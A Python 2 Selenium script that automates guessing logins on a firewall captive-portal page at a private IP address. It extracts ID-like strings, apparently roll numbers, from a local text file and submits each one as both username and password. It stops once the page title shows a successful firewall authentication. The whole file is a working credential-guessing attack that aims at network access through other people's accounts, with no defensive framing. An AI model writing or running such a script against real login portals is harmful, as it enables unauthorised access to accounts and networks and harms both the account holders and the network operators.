from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
driver = webdriver.Chrome("chromedriver.exe")
def textParser():	
	import  re
	pattern = r"([A-Z]+)(\d+)([A-Z]+)"
	frolls = open('final.txt','r')
	string = frolls.read()
	matches = re.findall(pattern, string, flags=0)
	matches_final = [''.join(match) for match in matches]
	pattern = r"([a-z]+)(\d+)([a-z]+)"
	matches = re.findall(pattern, string, flags=0)
	matches_final += [''.join(match) for match in matches]
	print matches_final
	# matches_final += [''.join(match).lower() for match in matches]
	# matches_final += [''.join(match).lower() for match in matches]
	return matches_final
def logger(matches_final):
	i = len(matches_final)
	print i
	while i>-1:
		driver.get("http://172.16.24.1:1000/logout?000a0e020b1241ca")
		name = matches_final[i-1]
		uname = driver.find_element_by_name("username")
		uname.send_keys(name)
		passwd = driver.find_element_by_name("password")
		passwd.send_keys(name)
		passwd.send_keys(Keys.RETURN) 
		print name
		if driver.title == 'Firewall Authentication Keepalive Window':
			print "connected "+ name
			print "Exiting....Bye!!"
			driver.close()
			break
		i = i-1
logger(textParser())






